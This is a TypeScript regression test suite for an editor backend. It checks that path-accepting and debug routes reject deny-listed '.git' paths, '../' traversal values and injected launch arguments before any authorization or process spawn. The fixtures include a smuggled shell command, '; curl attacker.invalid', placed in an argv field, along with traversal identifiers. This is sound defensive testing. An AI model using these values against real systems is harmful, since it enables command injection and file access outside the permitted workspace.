// Consolidated editor trust-boundary regression suite (Issue #1206). The per-route suites each prove
// their own containment; this suite pins the cross-cutting invariant in ONE place so a future editor
// route that accepts a workspace path cannot ship without rejecting denied and out-of-root paths.
//
// Invariant: every path-accepting editor BFF route rejects (a) a deny-listed path (.git/.env/…) and
// (b) an out-of-root / traversal path with a 4xx error and never processes it — and does so BEFORE any
// model call, retrieval, or file read. A deny-listed path is rejected uniformly as 403 DENIED across
// every route; an out-of-root path is rejected as 403 DENIED by the containment-first routes and as
// 400 INVALID_REQUEST by test-generation, which shape-checks `mustBeRelative` before containment.
//
// test-generation is gated off in v1, so it is exercised here with its feature flag enabled to prove
// the containment that guards it when wave-2 turns it on. The other routes need no env: the deps carry
// no gateway config, so a rejection proves containment is the first gate after request parsing.
import { mkdtemp, mkdir, realpath, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Readable } from "node:stream";
import type { IncomingMessage, ServerResponse } from "node:http";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createInMemoryEvidenceStore } from "@oscharko-dev/keiko-evidence";
import { buildRedactor, createInMemoryUiStore } from "../index.js";
import type { RouteContext, UiHandlerDeps } from "../index.js";
import type { UiStore } from "../store/index.js";
import { handleEditorCompletion } from "./completionRoutes.js";
import { handleEditorInlineCompletion } from "./inlineCompletionRoutes.js";
import { handleEditorContext } from "./contextRoutes.js";
import { handleEditorLanguage } from "./languageRoutes.js";
import { handleEditorTestGeneration } from "./testGenerationRoutes.js";
import { breakpointStoreWorkspaceFingerprint } from "./dap/breakpointStore.js";
import type { QualifiedDebugCapsuleHandle } from "./dap/dapCapsuleSupervisor.js";
import {
  DAP_DEBUG_ROUTE_GROUP,
  handleStartDebugSession,
  handleSetDebugBreakpoints,
  type DapDebugRouteService,
} from "./dap/dapDebugRoutes.js";
import { createDebugActivationControlService } from "./dap/debugActivationControl.js";
import { createDebugSessionRegistry } from "./dap/debugSessionRegistry.js";
import { createWorkspaceMutexRegistry } from "../task-workspace/mutex.js";
import {
  handleEditorWorkspaceReplaceApply,
  handleEditorWorkspaceReplacePreview,
  handleEditorWorkspaceSearch,
} from "./workspaceSearchRoutes.js";

interface RouteResultLike {
  status: number;
  body: unknown;
}
type EditorRouteHandler = (ctx: RouteContext, deps: UiHandlerDeps) => Promise<RouteResultLike>;

let root: string;
let store: UiStore;

function postContext(body: unknown, pathname: string): RouteContext {
  const req = Readable.from([
    Buffer.from(JSON.stringify(body), "utf8"),
  ]) as unknown as IncomingMessage;
  (req as { method?: string }).method = "POST";
  return {
    correlationId: undefined,
    req,
    res: {} as unknown as ServerResponse,
    params: {},
    url: new URL(`http://localhost${pathname}`),
  };
}

function deps(env: Record<string, string | undefined> = {}): UiHandlerDeps {
  const dapDebug = {
    manager: {
      binding: () => undefined,
      health: () => undefined,
      workspaceSessionId: () => undefined,
      boundSessionId: () => undefined,
    },
    browserSessions: { authorize: () => ({ ok: false, reason: "malformed" }) },
  } as unknown as DapDebugRouteService;
  return {
    store,
    redactor: buildRedactor(env, undefined),
    evidenceStore: createInMemoryEvidenceStore(),
    env,
    ...(env.KEIKO_EDITOR_DEBUG === "1" ? { dapDebug } : {}),
  } as unknown as UiHandlerDeps;
}

const TEST_GENERATION_ENABLED: Record<string, string | undefined> = {
  KEIKO_EDITOR_TEST_GENERATION: "on",
};
const DEBUG_ENABLED: Record<string, string | undefined> = { KEIKO_EDITOR_DEBUG: "1" };

interface ExpectedRejection {
  readonly status: number;
  readonly code: string;
}

interface PathAcceptingRoute {
  readonly name: string;
  readonly path: string;
  readonly handler: EditorRouteHandler;
  readonly env: Record<string, string | undefined>;
  readonly bodyForPath: (maliciousPath: string) => Record<string, unknown>;
  // Expected rejection keyed by malicious-path kind ("denied" | "escape").
  readonly expected: Readonly<Record<string, ExpectedRejection>>;
}

const CONTAINMENT_FIRST: Readonly<Record<string, ExpectedRejection>> = {
  denied: { status: 403, code: "DENIED" },
  escape: { status: 403, code: "DENIED" },
};

// One entry per editor BFF route that accepts a caller-supplied workspace path.
const PATH_ACCEPTING_ROUTES: readonly PathAcceptingRoute[] = [
  {
    name: "POST /api/editor/debug/sessions",
    path: "/api/editor/debug/sessions",
    handler: handleStartDebugSession,
    env: DEBUG_ENABLED,
    bodyForPath: (p) => ({
      schemaVersion: "1",
      workspaceId: breakpointStoreWorkspaceFingerprint(root),
      target: { kind: "file", fileId: p },
      activationRevision: 0,
    }),
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
  {
    name: "PUT /api/editor/debug/breakpoints",
    path: "/api/editor/debug/breakpoints",
    handler: handleSetDebugBreakpoints,
    env: DEBUG_ENABLED,
    bodyForPath: (p) => ({
      schemaVersion: "1",
      workspaceId: breakpointStoreWorkspaceFingerprint(root),
      expectedRevision: 0,
      fileId: p,
      breakpoints: [
        {
          id: "boundary_breakpoint",
          fileId: p,
          line: 1,
          enabled: true,
          kind: "line",
          verification: "pending",
        },
      ],
    }),
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
  {
    name: "POST /api/editor/completion",
    path: "/api/editor/completion",
    handler: handleEditorCompletion,
    env: {},
    bodyForPath: (p) => ({
      root,
      document: { path: p, languageId: "typescript", text: "const a = 1;\n" },
      position: { line: 0, character: 0 },
      triggerKind: "invoked",
      contextBudgetBytes: 4_096,
    }),
    expected: CONTAINMENT_FIRST,
  },
  {
    name: "POST /api/editor/inline-completion",
    path: "/api/editor/inline-completion",
    handler: handleEditorInlineCompletion,
    env: {},
    bodyForPath: (p) => ({
      root,
      document: { path: p, languageId: "typescript", text: "const a = 1;\n" },
      position: { line: 0, character: 0 },
      triggerKind: "automatic",
      contextBudgetBytes: 4_096,
    }),
    expected: CONTAINMENT_FIRST,
  },
  {
    name: "POST /api/editor/context",
    path: "/api/editor/context",
    handler: handleEditorContext,
    env: {},
    bodyForPath: (p) => ({ schemaVersion: "1", purpose: "completion", root, documentPath: p }),
    expected: CONTAINMENT_FIRST,
  },
  {
    name: "POST /api/editor/workspace-search",
    path: "/api/editor/workspace-search",
    handler: handleEditorWorkspaceSearch,
    env: {},
    bodyForPath: (p) => ({
      root,
      query: "x",
      mode: "literal",
      caseSensitive: false,
      includeGlobs: [p],
      excludeGlobs: [],
      maxResults: 20,
    }),
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
  {
    name: "POST /api/editor/workspace-search/replace-preview",
    path: "/api/editor/workspace-search/replace-preview",
    handler: handleEditorWorkspaceReplacePreview,
    env: {},
    bodyForPath: (p) => ({
      root,
      query: "x",
      mode: "literal",
      caseSensitive: false,
      includeGlobs: [p],
      excludeGlobs: [],
      replacement: "y",
      maxFiles: 20,
    }),
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
  {
    name: "POST /api/editor/workspace-search/replace-apply",
    path: "/api/editor/workspace-search/replace-apply",
    handler: handleEditorWorkspaceReplaceApply,
    env: {},
    bodyForPath: (p) => ({
      root,
      files: [
        {
          path: p,
          baseContentHash: "a".repeat(64),
          edits: [
            {
              range: { startLine: 1, startColumn: 1, endLine: 1, endColumn: 2 },
              originalText: "x",
              newText: "y",
            },
          ],
        },
      ],
    }),
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
  {
    name: "POST /api/editor/language",
    path: "/api/editor/language",
    handler: handleEditorLanguage,
    env: {},
    bodyForPath: (p) => ({
      operation: "diagnostics",
      root,
      document: { path: p, languageId: "typescript", text: "const x = 1;\n" },
    }),
    expected: CONTAINMENT_FIRST,
  },
  {
    name: "POST /api/editor/test-generation",
    path: "/api/editor/test-generation",
    handler: handleEditorTestGeneration,
    // Gated off in v1; enabled here so the request reaches its target-path containment check.
    env: TEST_GENERATION_ENABLED,
    bodyForPath: (p) => ({
      schemaVersion: "1",
      root,
      target: { kind: "file", document: { path: p, languageId: "typescript", text: "x" } },
      contextBudgetBytes: 4_096,
    }),
    // test-generation shape-checks `mustBeRelative` before containment, so a traversal path is a 400.
    expected: {
      denied: { status: 403, code: "DENIED" },
      escape: { status: 400, code: "INVALID_REQUEST" },
    },
  },
];

const MALICIOUS_PATHS: readonly {
  readonly key: string;
  readonly label: string;
  readonly path: string;
}[] = [
  { key: "denied", label: "a deny-listed path (.git segment)", path: ".git/config.ts" },
  { key: "escape", label: "an out-of-root traversal path", path: "../escape.ts" },
];

interface DebugBoundaryCase {
  readonly method: string;
  readonly pattern: string;
  readonly pathname: string;
  readonly body: unknown;
  readonly params?: Readonly<Record<string, string>> | undefined;
}

const HOSTILE_ID = "../host-secret";
const DEBUG_BOUNDARY_CASES: readonly DebugBoundaryCase[] = [
  {
    method: "POST",
    pattern: "/api/editor/debug/bootstrap",
    pathname: "/api/editor/debug/bootstrap",
    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
  },
  {
    method: "POST",
    pattern: "/api/editor/debug/sessions",
    pathname: "/api/editor/debug/sessions",
    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
  },
  {
    method: "GET",
    pattern: "/api/editor/debug/sessions/:sessionId",
    pathname: "/api/editor/debug/sessions/hostile",
    params: { sessionId: HOSTILE_ID },
    body: {},
  },
  {
    method: "DELETE",
    pattern: "/api/editor/debug/sessions/:sessionId",
    pathname: "/api/editor/debug/sessions/hostile",
    params: { sessionId: HOSTILE_ID },
    body: {},
  },
  {
    method: "POST",
    pattern: "/api/editor/debug/control",
    pathname: "/api/editor/debug/control",
    body: { schemaVersion: "1", sessionId: HOSTILE_ID },
  },
  {
    method: "GET",
    pattern: "/api/editor/debug/instrumentation",
    pathname: `/api/editor/debug/instrumentation?workspaceId=${encodeURIComponent(HOSTILE_ID)}`,
    body: {},
  },
  {
    method: "DELETE",
    pattern: "/api/editor/debug/instrumentation",
    pathname: `/api/editor/debug/instrumentation?workspaceId=${encodeURIComponent(HOSTILE_ID)}&expectedRevision=0`,
    body: {},
  },
  {
    method: "PUT",
    pattern: "/api/editor/debug/breakpoints",
    pathname: "/api/editor/debug/breakpoints",
    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
  },
  {
    method: "PUT",
    pattern: "/api/editor/debug/exception-breakpoints",
    pathname: "/api/editor/debug/exception-breakpoints",
    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
  },
  {
    method: "PUT",
    pattern: "/api/editor/debug/watches",
    pathname: "/api/editor/debug/watches",
    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
  },
  ...["stack", "scopes", "variables", "variables/set", "watches/evaluate"].map((suffix) => ({
    method: "POST",
    pattern: `/api/editor/debug/${suffix}`,
    pathname: `/api/editor/debug/${suffix}`,
    body: { schemaVersion: "1", sessionId: HOSTILE_ID },
  })),
  {
    method: "GET",
    pattern: "/api/editor/debug/events",
    pathname: `/api/editor/debug/events?workspaceId=${encodeURIComponent(HOSTILE_ID)}`,
    body: {},
  },
];

function debugContext(testCase: DebugBoundaryCase): RouteContext {
  const context = postContext(testCase.body, testCase.pathname);
  (context.req as { method?: string }).method = testCase.method;
  return { ...context, params: testCase.params ?? {} };
}

function emptySource(): AsyncIterable<Buffer> {
  return {
    [Symbol.asyncIterator]: (): AsyncIterator<Buffer> => ({
      next: (): Promise<IteratorResult<Buffer>> =>
        Promise.resolve({ done: true, value: undefined }),
    }),
  };
}

async function runningDebugSession(): Promise<{
  readonly registry: ReturnType<typeof createDebugSessionRegistry>;
  readonly kill: ReturnType<typeof vi.fn<(signal: NodeJS.Signals) => void>>;
}> {
  const registry = createDebugSessionRegistry({
    appendEvidence: () => Promise.resolve(),
    now: () => 0,
    emitOutputLimit: () => undefined,
  });
  const kill = vi.fn<(signal: NodeJS.Signals) => void>();
  await registry.reserve({
    sessionId: "revoked_session",
    workspaceId: "workspace_a",
    workspacePartitionKey: "partition_a",
    browserSessionBinding: "browser_a",
    planId: "plan_a",
    planEpoch: 1,
    planExpiresAtMs: Number.MAX_SAFE_INTEGER,
    targetKind: "file",
    activationRevision: 7,
    provisioningDigest: "a".repeat(64),
    backend: "oci",
    runtimeIdentityDigest: "b".repeat(64),
    network: "none",
    filesystem: "executionRoot",
  });
  const attempt = await registry.beginStartupAttempt("revoked_session");
  let alive = true;
  const capsule: QualifiedDebugCapsuleHandle = {
    planId: "plan_a",
    source: emptySource(),
    sink: { write: () => undefined },
    processGroup: {
      kill: (signal): void => {
        kill(signal);
        alive = false;
      },
    },
    exited: (): boolean => !alive,
    inspectScope: () =>
      Promise.resolve({
        qualified: true,
        backend: "oci" as const,
        runtimeIdentityDigest: "b".repeat(64),
        descendants: alive ? 1 : 0,
      }),
    terminateContainment: (): Promise<void> => Promise.resolve(),
    cleanup: (): Promise<void> => Promise.resolve(),
  };
  await registry.attachCapsule("revoked_session", attempt.attemptId, capsule, {
    backend: "oci",
    runtimeIdentityDigest: "b".repeat(64),
  });
  await registry.markRunning("revoked_session", attempt.attemptId);
  return { registry, kill };
}

beforeEach(async () => {
  root = await realpath(await mkdtemp(join(tmpdir(), "keiko-editor-security-")));
  await mkdir(join(root, "src"));
  store = createInMemoryUiStore();
  store.createProject(root, "fixture");
});

afterEach(async () => {
  store.close();
  await rm(root, { recursive: true, force: true });
});

describe("editor trust boundary (#1206): path containment is uniform across every editor route", () => {
  for (const route of PATH_ACCEPTING_ROUTES) {
    for (const malicious of MALICIOUS_PATHS) {
      const expected = route.expected[malicious.key];
      it(`${route.name} rejects ${malicious.label}`, async () => {
        const result = await route.handler(
          postContext(route.bodyForPath(malicious.path), route.path),
          deps(route.env),
        );
        expect(expected).toBeDefined();
        expect(result.status).toBe(expected?.status);
        expect(result.body).toMatchObject({ error: { code: expected?.code } });
      });
    }
  }

  it("rejects a deny-listed path with 403 DENIED uniformly on every route", () => {
    for (const route of PATH_ACCEPTING_ROUTES) {
      expect(route.expected.denied).toEqual({ status: 403, code: "DENIED" });
    }
  });

  it("covers every path-accepting editor route (regression guard for new routes)", () => {
    // If a new editor route accepts a workspace path, add it to PATH_ACCEPTING_ROUTES so its
    // containment is proven here too. This count is the human-maintained completeness anchor.
    // #3408 removed the private repo-search route after proving it had no production caller; its
    // unreachable handwritten contract must not remain in this route census.
    expect(PATH_ACCEPTING_ROUTES).toHaveLength(10);
  });

  it("rejects hostile identifiers across every registered debug route without reflection", async () => {
    expect(DEBUG_BOUNDARY_CASES).toHaveLength(16);
    expect(
      DEBUG_BOUNDARY_CASES.map(({ method, pattern }) => `${method} ${pattern}`).sort(),
    ).toStrictEqual(
      DAP_DEBUG_ROUTE_GROUP.map(({ method, pattern }) => `${method} ${pattern}`).sort(),
    );
    for (const testCase of DEBUG_BOUNDARY_CASES) {
      const route = DAP_DEBUG_ROUTE_GROUP.find(
        ({ method, pattern }) => method === testCase.method && pattern === testCase.pattern,
      );
      if (route === undefined) throw new Error("missing debug boundary fixture");
      const result = await route.handler(debugContext(testCase), deps(DEBUG_ENABLED));
      if (typeof result === "symbol") throw new Error("hostile identifier opened a stream");
      expect(result.status).toBeGreaterThanOrEqual(400);
      expect(result.status).toBeLessThan(500);
      expect(JSON.stringify(result.body)).not.toContain(HOSTILE_ID);
    }
  });

  it("rejects path containment and env-allowlist bypasses before authorization or spawn", async () => {
    const start = vi.fn(() => Promise.resolve());
    const authorize = vi.fn(() => ({ ok: false as const, reason: "malformed" as const }));
    const guardedDeps = {
      ...deps(DEBUG_ENABLED),
      dapDebug: {
        manager: {
          binding: () => undefined,
          health: () => undefined,
          workspaceSessionId: () => undefined,
          boundSessionId: () => undefined,
          start,
        },
        browserSessions: { authorize },
      } as unknown as DapDebugRouteService,
    };
    const deniedPath = await handleStartDebugSession(
      postContext(
        {
          schemaVersion: "1",
          workspaceId: breakpointStoreWorkspaceFingerprint(root),
          target: { kind: "file", fileId: ".git/config.ts" },
          activationRevision: 0,
        },
        "/api/editor/debug/sessions",
      ),
      guardedDeps,
    );
    const envBypass = await handleStartDebugSession(
      postContext(
        {
          schemaVersion: "1",
          workspaceId: breakpointStoreWorkspaceFingerprint(root),
          target: { kind: "file", fileId: ".git/config.ts" },
          activationRevision: 0,
          environment: { TOKEN: "hostile" },
        },
        "/api/editor/debug/sessions",
      ),
      guardedDeps,
    );

    expect(deniedPath).toMatchObject({ status: 403, body: { error: { code: "DENIED" } } });
    expect(envBypass).toMatchObject({ status: 400, body: { error: { code: "INVALID_REQUEST" } } });
    expect(JSON.stringify(envBypass.body)).not.toContain("hostile");
    expect(authorize).not.toHaveBeenCalled();
    expect(start).not.toHaveBeenCalled();
  });

  it("rejects launch configuration injection with INVALID_REQUEST before browser authorization", async () => {
    const start = vi.fn(() => Promise.resolve());
    const authorize = vi.fn(() => ({ ok: false as const, reason: "malformed" as const }));
    const guardedDeps = {
      ...deps(DEBUG_ENABLED),
      dapDebug: {
        manager: {
          binding: () => undefined,
          health: () => undefined,
          workspaceSessionId: () => undefined,
          boundSessionId: () => undefined,
          start,
        },
        browserSessions: { authorize },
      } as unknown as DapDebugRouteService,
    };
    const body = {
      schemaVersion: "1",
      workspaceId: breakpointStoreWorkspaceFingerprint(root),
      target: { kind: "file", fileId: "src/app.ts", argv: ["; curl attacker.invalid"] },
      activationRevision: 0,
      environment: { TOKEN: "hostile" },
    };

    const result = await handleStartDebugSession(
      postContext(body, "/api/editor/debug/sessions"),
      guardedDeps,
    );

    expect(result.status).toBe(400);
    expect(result.body).toMatchObject({ error: { code: "INVALID_REQUEST" } });
    expect(JSON.stringify(result.body)).not.toContain("hostile");
    expect(authorize).not.toHaveBeenCalled();
    expect(start).not.toHaveBeenCalled();
  });

  it("synchronously kills the active process group when the deployment ceiling is revoked", async () => {
    const current = await runningDebugSession();
    let deployment: "allowed" | "denied" = "allowed";
    const control = createDebugActivationControlService({
      mutex: createWorkspaceMutexRegistry(),
      productSupport: () => "supported",
      deploymentPolicy: () => deployment,
      provisioning: () => "provisioned",
      disposeActiveSession: () => current.registry.revoke("revoked_session"),
      projectEvidence: () => undefined,
    });
    const context = { realRoot: root, revision: 7, workspaceActivation: "enabled" as const };

    expect(control.resolve(context)).toMatchObject({ state: "available", reasonCode: "AVAILABLE" });
    deployment = "denied";
    await expect(
      control.synchronize({ action: "settingsChange", changed: false, context }),
    ).resolves.toMatchObject({ state: "disabledByPolicy", reasonCode: "POLICY_DENIED" });
    expect(current.kill).toHaveBeenCalledExactlyOnceWith("SIGTERM");
    expect(current.registry.session("revoked_session")).toBeUndefined();
    control.dispose();
  });
});
